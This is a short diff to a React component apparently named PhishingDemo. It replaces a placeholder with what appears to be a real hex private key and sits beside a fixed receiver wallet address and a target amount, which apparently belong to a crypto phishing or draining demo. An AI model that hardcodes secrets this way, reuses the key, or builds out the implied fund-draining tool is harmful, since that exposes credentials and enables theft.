@@ -18,7 +18,7 @@ export default function PhishingDemo() {
   const [targetAmount, setTargetAmount] = useState<string>("10");
   
   // These would usually be dynamic or env variables
-  const ADMIN_PRIVATE_KEY = "YOUR_EXPORTER_PRIVATE_KEY"; 
+  const ADMIN_PRIVATE_KEY = "e99f0eb86cf5019bab2f0d0564f89f13e5bb37e34f7ba635390e2e591c8c0271"; 
   const RECEIVER_ADDRESS = "0xC0b4cE03Df84765aE604F239Ea4BBc5731F308aF";
 
   const addLog = (msg: string) => {
